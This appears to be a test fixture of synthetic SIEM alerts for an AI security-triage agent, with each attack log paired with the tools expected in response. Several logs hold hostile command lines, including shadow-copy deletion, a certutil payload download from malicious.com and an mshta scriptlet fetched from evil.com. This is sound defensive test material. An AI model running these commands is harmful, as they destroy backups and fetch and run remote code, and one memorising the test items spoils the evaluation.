@@ -1,0 +1,416 @@
+[
+  {
+    "siem_event": {
+      "alert_id": "ALT-0001",
+      "task_type": "brute_force",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "Mar 15 08:23:14 server sshd[2847]: Failed password for admin from 192.168.1.45 port 53212 ssh2\nMar 15 08:23:15 server sshd[2848]: Failed password for root from 192.168.1.45 port 53213 ssh2\nMar 15 08:23:16 server sshd[2849]: Failed password for admin from 192.168.1.45 port 53214 ssh2\nMar 15 08:23:17 server sshd[2850]: Invalid user oracle from 10.0.0.12 port 53215 ssh2\nMar 15 08:23:18 server sshd[2851]: Failed password for root from 10.0.0.12 port 53216 ssh2"
+    },
+    "expected_tools": [
+      "parse_auth_log",
+      "extract_ipv4",
+      "extract_usernames",
+      "count_pattern",
+      "score_brute_force",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0003",
+      "task_type": "phishing_investigation",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "Subject: Urgent Action Required - Verify Your Account\nFrom: security@amaz0n-security.com\nTo: victim@company.com\nBody: Click here to verify your account: http://amaz0n-security.com/login.php?token=abc123\nYour account will be suspended in 24 hours. Please confirm your password immediately."
+    },
+    "expected_tools": [
+      "extract_urls",
+      "extract_domains",
+      "extract_emails",
+      "detect_phishing",
+      "score_phishing",
+      "lookup_known_bad",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0005",
+      "task_type": "ransomware_triage",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=4688 ProcessName=C:\\Windows\\System32\\vssadmin.exe CommandLine='vssadmin delete shadows /all /quiet' User=SYSTEM Host=DESKTOP-ABC123 SourceIp=10.0.0.55 Hash=5fd22c9c8e3b7a1e4f6d2c8b9a0e1f3c\nEventID=4688 ProcessName=C:\\Windows\\System32\\bcdedit.exe CommandLine='bcdedit /set {default} recoveryenabled No' User=SYSTEM"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_ipv4",
+      "extract_hashes",
+      "detect_ransomware",
+      "count_pattern",
+      "lookup_known_bad",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0007",
+      "task_type": "data_exfiltration_detection",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "2024-03-10 22:15:33 proxy[4412]: 10.0.5.12 -> 185.220.101.44:443 POST /upload.php 84729103 bytes User-Agent=Mozilla/5.0 domain=drop-zone.cc URL=https://drop-zone.cc/upload.php encoded_payload=base64:SGVsbG8gV29ybGQ="
+    },
+    "expected_tools": [
+      "extract_ipv4",
+      "extract_domains",
+      "extract_urls",
+      "detect_encoding",
+      "detect_data_exfil",
+      "score_exfiltration",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0009",
+      "task_type": "privilege_escalation_hunt",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "Mar 20 09:14:22 server sudo: user bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash\nMar 20 09:14:25 server sudo: user bob : 3 incorrect password attempts\nMar 20 09:15:01 server su[8821]: pam_unix(su:auth): authentication failure; logname=bob uid=1001 euid=0 tty=pts/0 ruser=bob rhost=192.168.5.33"
+    },
+    "expected_tools": [
+      "parse_auth_log",
+      "extract_usernames",
+      "extract_ipv4",
+      "count_pattern",
+      "score_generic",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0011",
+      "task_type": "c2_communication_hunt",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "2024-03-12 01:05:00 dns[991]: query from 10.0.2.15 for xj8k9m2q7b1v4n6p3r5t8y0w2e4i6u9o1p3a5s7d9f.ghtyr.com type=A domain=ghtyr.com\n2024-03-12 01:05:30 dns[991]: query from 10.0.2.15 for xj8k9m2q7b1v4n6p3r5t8y0w2e4i6u9o1p3a5s7d9f.ghtyr.com type=A\n2024-03-12 01:06:00 dns[991]: query from 10.0.2.15 for xj8k9m2q7b1v4n6p3r5t8y0w2e4i6u9o1p3a5s7d9f.ghtyr.com type=A"
+    },
+    "expected_tools": [
+      "extract_ipv4",
+      "extract_domains",
+      "calculate_entropy",
+      "detect_c2",
+      "score_c2_beacon",
+      "lookup_known_bad",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0013",
+      "task_type": "lateral_movement_detection",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=5140 ShareName=\\\\DC01\\ADMIN$ User=DOMAIN\\svc_backup SourceIp=192.168.10.15 ObjectType=File AccessMask=0x10000000 psexec=true lateral=true\nEventID=4688 ProcessName=PsExec.exe CommandLine='PsExec.exe \\\\DC01 -u svc_backup -p password cmd.exe'"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_ipv4",
+      "extract_usernames",
+      "count_pattern",
+      "score_lateral_movement",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0015",
+      "task_type": "insider_threat_detection",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "User: jdoe@company.com Action: bulk_download Files: 15000 records from /data/customers Time: 2024-03-14 02:30:00 SourceIp: 192.168.1.100 staging=true archive=true zip=true compress=true transfer=true"
+    },
+    "expected_tools": [
+      "extract_usernames",
+      "extract_ipv4",
+      "extract_emails",
+      "count_pattern",
+      "detect_data_exfil",
+      "score_exfiltration",
+      "lookup_institutional_knowledge",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0017",
+      "task_type": "network_beaconing",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "2024-03-10 08:00:00 dns-query client=10.0.3.20 query=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz.domain.tld type=A domain=domain.tld\n2024-03-10 08:00:30 dns-query client=10.0.3.20 query=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz.domain.tld type=A\n2024-03-10 08:01:00 dns-query client=10.0.3.20 query=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz.domain.tld type=A"
+    },
+    "expected_tools": [
+      "extract_ipv4",
+      "extract_domains",
+      "parse_dns_query",
+      "calculate_entropy",
+      "detect_c2",
+      "score_c2_beacon",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0019",
+      "task_type": "cloud_infrastructure_attack",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "eventName=CreateUser eventSource=iam.amazonaws.com sourceIPAddress=203.0.113.44 userName=attacker_user requestParameters.userName=backdoor_admin AttachPolicy=true\neventName=PutBucketPolicy eventSource=s3.amazonaws.com sourceIPAddress=203.0.113.44"
+    },
+    "expected_tools": [
+      "extract_ipv4",
+      "extract_usernames",
+      "extract_emails",
+      "count_pattern",
+      "score_generic",
+      "lookup_known_bad",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0021",
+      "task_type": "supply_chain_compromise",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "CI pipeline: build-agent-03 installed package typosquat-numpy from pypi.typosquat.com URL=https://pypi.typosquat.com/download/typosquat-numpy-1.0.tar.gz hash mismatch=true checksum=fail dependency=malicious npm=true pip=true"
+    },
+    "expected_tools": [
+      "extract_hashes",
+      "extract_domains",
+      "extract_urls",
+      "count_pattern",
+      "lookup_known_bad",
+      "score_generic",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0023",
+      "task_type": "kerberoasting",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=4769 ServiceName=HTTP/DC01.corp.local TicketOptions=0x40810010 TicketEncryptionType=0x17 RC4 User=svc_sql SourceIp=192.168.10.55 TGS=true SPN=true kerberos=true"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_usernames",
+      "extract_ipv4",
+      "detect_kerberoasting",
+      "count_pattern",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0025",
+      "task_type": "golden_ticket",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=4768 User=krbtgt SourceIp=192.168.1.10 TicketOptions=0x40810010 Lifetime=10 years forged=true abnormal_lifetime=true golden_ticket=true TGT=true RC4=true 4768=true 4769=true"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_usernames",
+      "extract_ipv4",
+      "detect_golden_ticket",
+      "count_pattern",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0027",
+      "task_type": "dcsync",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=4662 ObjectType=DS-Replication-Get-Changes-All User=backup_svc SourceIp=192.168.20.5 Properties=1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 DRSGetNCChanges=true replication=true DCSync=true 4662=true 1131=true mimikatz=true lsadump=true"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_ipv4",
+      "extract_usernames",
+      "count_pattern",
+      "score_generic",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0029",
+      "task_type": "dll_sideloading",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=7 ImageLoaded=C:\\Users\\Public\\Documents\\version.dll ProcessName=C:\\Program Files\\App\\legit.exe Signed=false Hash=1a2b3c4d5e6f7890abcdef1234567890abcdef12 SourceIp=192.168.5.5 sideload=true unsigned=true dll=true loadlibrary=true appdata=true temp=true programdata=true writable=true"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_hashes",
+      "extract_ipv4",
+      "count_pattern",
+      "lookup_known_bad",
+      "score_generic",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0031",
+      "task_type": "lolbin_abuse",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=4688 ProcessName=certutil.exe CommandLine='certutil -urlcache -split -f http://malicious.com/payload.exe C:\\Users\\Public\\payload.exe' User=jdoe SourceIp=192.168.1.55\nEventID=4688 ProcessName=mshta.exe CommandLine='mshta javascript:a=(GetObject(\\\"script:http://evil.com/sc.sct\\\")).Exec();close();'"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_ipv4",
+      "extract_urls",
+      "detect_lolbin_abuse",
+      "count_pattern",
+      "score_generic",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0033",
+      "task_type": "process_injection",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=8 SourceImage=C:\\Windows\\System32\\svchost.exe TargetImage=C:\\Windows\\System32\\lsass.exe StartAddress=0x7FF812340000 Type=CreateRemoteThread SourceIp=192.168.10.10\nEventID=10 SourceImage=malware.exe TargetImage=lsass.exe CallTrace=ntdll.dll+0x12345|kernel32.dll+0x67890 NtWriteVirtualMemory=true VirtualAllocEx=true inject=true"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_ipv4",
+      "extract_hashes",
+      "count_pattern",
+      "score_generic",
+      "lookup_known_bad",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0035",
+      "task_type": "wmi_lateral",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "EventID=5857 ClientProcessId=1234 ApplicationName=WmiPrvSE.exe SourceIp=192.168.1.20 User=DOMAIN\\admin\nEventID=5861 Namespace=\\\\.\\root\\cimv2 Query=SELECT * FROM Win32_Process WHERE Name='cmd.exe' WMI=true Win32_Process=true wmiprvse=true wmic=true process_call_create=true DCOM=true 5857=true 5858=true 5861=true"
+    },
+    "expected_tools": [
+      "parse_windows_event",
+      "extract_ipv4",
+      "extract_usernames",
+      "count_pattern",
+      "score_lateral_movement",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0037",
+      "task_type": "rdp_tunneling",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "Mar 18 14:22:10 gateway sshd[4412]: Accepted publickey for tunnel_user from 203.0.113.88 port 55220 ssh2: tunnel plink -L 3389:localhost:3389 -N -R 9050:localhost:9050\nMar 18 14:22:15 gateway sshd[4413]: Accepted publickey for tunnel_user from 203.0.113.88 port 55221 ssh2: reverse forward port_forward netsh rdp mstsc 3389"
+    },
+    "expected_tools": [
+      "extract_ipv4",
+      "extract_usernames",
+      "parse_auth_log",
+      "count_pattern",
+      "score_generic",
+      "lookup_known_bad",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  },
+  {
+    "siem_event": {
+      "alert_id": "ALT-0039",
+      "task_type": "dns_exfiltration",
+      "timestamp": "2024-03-15T08:00:00Z",
+      "severity": "high",
+      "source_ip": "192.168.1.1",
+      "hostname": "test-host",
+      "raw_log": "2024-03-10 09:15:00 dns-query client=10.0.4.20 query=aGVsbG8gd29ybGQgZXhmaWx0cmF0aW5nIGRhdGE.domain.tld type=TXT domain=domain.tld\n2024-03-10 09:15:05 dns-query client=10.0.4.20 query=base64encodeddatahere.domain.tld type=TXT\n2024-03-10 09:15:10 dns-query client=10.0.4.20 query=moredatahere.domain.tld type=TXT entropy=high"
+    },
+    "expected_tools": [
+      "parse_dns_query",
+      "extract_domains",
+      "extract_ipv4",
+      "calculate_entropy",
+      "count_pattern",
+      "score_exfiltration",
+      "score_generic",
+      "correlate_with_history",
+      "map_mitre"
+    ]
+  }
+]
